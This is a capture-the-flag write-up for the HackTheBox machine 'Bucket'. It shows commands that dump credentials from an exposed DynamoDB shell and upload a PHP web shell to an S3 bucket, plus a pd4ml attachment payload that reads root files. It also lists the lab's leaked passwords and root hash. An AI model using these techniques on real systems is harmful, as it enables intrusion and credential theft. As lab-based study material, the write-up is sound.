# Bucket - Medium

### Intial recon
After a brief run of nmap using `nmap -sC -sV -oN nmap/all 10.10.10.212 -p- -v` we get two ports open: 22(ssh) and 80(web),so this box user is all about web exploits. 

### Initial recon on web 
At first we are greeted with a redirect to `bucket.htb` which I already added in `/etc/hosts`. Here there is a weird website that doesn't have any aditional links, so the only thing left to do is check the source code and start a gobuster in the background. 

After we scroll those few hundered lines of css we endup with a new subdomain `s3.bucket.htb` which might be a hint to AWS S3 services. Now we are greeted with a json response `{"status": "running"}`. So I started another gobuster and got two endpoints: `/health` and `/shell`. The `health` endpoint discloses the two services that are running s3 and dynamodb while `shell` is kindof broken. In order to access the console you must do `http://s3.bucket.htb/shell/`, otherwise it will redirect to a trash url that might be a docker container id.

### Getting the foothold

The most obvious thing was to search for the docs and I've found at this link [AWS Javascript SDK](https://docs.aws.amazon.com/AWSJavaScriptSDK/latest/AWS/DynamoDB_20111205.html) manual/documentation. Here it comes a sequence of commands:
```javascript
var params = {};
dynamodb.listTables(params, function(err, data) {
  if (err) console.log(err, err.stack); // an error occurred
  else     console.log(data);           // successful response
});
/**
Which outputs
{"TableNames":["users"]}
*/
```

In order to querry this table, the documentation was useless so I've found this answer on [StackOverflow](https://stackoverflow.com/questions/57988963/how-to-access-dynamodb-local-using-dynamodb-javascript-shell) that outputs
```javascript
var params = {
    TableName: 'users'
};
dynamodb.scan(params, function(err, data) {
    if (err) ppJson(err); // an error occurred
    else ppJson(data); // successful response
});

/**
"Items"[
    0:{
        "password":{"S": "Management@#1@#"},
        "username":{"S": "Mgmt"}
    },
    1:{
        "password":{"S": "Welcome123!"},
        "username":{"S": "Cloudadm"}
    },
    2:{
        "password":{"S": "n2vM-<_K_Q:.Aa2"},
        "username":{"S": "Sysadm"}
    }
],
"Count": 3,
"ScannedCount": 3
*/
```

So now we have 3 usernames and their passwords. I tried all 9 combinations and non worked on ssh. This made me thing that we must find the username that's on the box and match it with one of these 3 passwords. In order to do this I tought we that I should use AWS CLI so i installed it. Here there were three things that I didn't know: `AWS Access Key ID`. `AWS Secret Access Key ` and `Region`. For first two I just created an account on AWS and passed my keys (i don't quite know if they matter at all), and the last one was `us-east-1` found using this sequence:
```javascript
var params = {
  TableName: 'users' /* required */
};
dynamodb.describeTable(params, function(err, data) {
  if (err) console.log(err, err.stack); // an error occurred
  else     console.log(data);           // successful response
});
/*
{"Table":{"AttributeDefinitions":[{"AttributeName":"username","AttributeType":"S"},{"AttributeName":"password","AttributeType":"S"}],"TableName":"users","KeySchema":[{"AttributeName":"username","KeyType":"HASH"},{"AttributeName":"password","KeyType":"RANGE"}],"TableStatus":"ACTIVE","CreationDateTime":"2020-10-17T19:03:03.008Z","ProvisionedThroughput":{"LastIncreaseDateTime":"1970-01-01T00:00:00.000Z","LastDecreaseDateTime":"1970-01-01T00:00:00.000Z","NumberOfDecreasesToday":0,"ReadCapacityUnits":5,"WriteCapacityUnits":5},"TableSizeBytes":107,"ItemCount":3,"TableArn":"arn:aws:dynamodb:us-east-1:000000000000:table/users"}}
*/
```

Now the on only thing left to do is upload a shell with `aws s3 cp index.php s3://adserver/index.php --endpoint-url http://s3.bucket.htb/` and trigger it accessing the `http://bucket.htb/index.php`. Now we have a shell, so we can `cat /etc/passwd |grep /usr/bin` which gives us `root` and `roy`.s

I tried to `ssh roy@bucket.htb` and pass the password for sysadm `n2vM-<_K_Q:.Aa2` and we got user.

### Getting the root 
This part was based on another web exploit and it was kindof obvious to check because it was an app in `/var/www`  that was available only on localhost. So I started the analisys in the `/var/www/bucket-app` directory. Here the `index.php` contains some juicy stuff which made me see the root path.

At first we must create a tabel called `alerts`, which has `title, data` as fields. The sequence can be found under `dynamodb.js`. Now I fall down in a rabbit hole and tried to symlink a lot of stuff but none worked. Than I remembered the `Book` part in which we could read files in a pdf so I tought that `pd4ml` can do the exact same thing. For this I've found [this](https://pd4ml.com/support/pdf-generation-troubleshooting-f4/attachment-embeding-taking-time-t1569.html) link that does the exact same thing. So the crafted payload is: `<pd4ml:attachment type="paperclip" description="a" src="/root/root.txt"/>`.


Now that we pwned this box, I want to try and see if we can get an SSH connection via the root hash or by retrieving the ssh keys. The hash seemed uncrackable, but in the root directory there was the `id_rsa` file so mission acomplished. It can be found under the `rootRSA` name in here. 


PWNED.

# Root hash
- $6$rvx83lCm9lfbxx/M$x56XT96DB4RIHKtx8HhObNwNNe1TBEAUZlkhhgE2Goqg.ZnbIn/VOD.T2Q0XhcTxmLmAMrjk5ad6Gsd/jgjQn/
# Credentials
- Mgmt:Management@#1@# (no use)
- Cloudadm:Welcome123! (no use)
- Sysadm:n2vM-<_K_Q:.Aa2 (no use)
- roy:n2vM-<_K_Q:.Aa2  (user, ssh)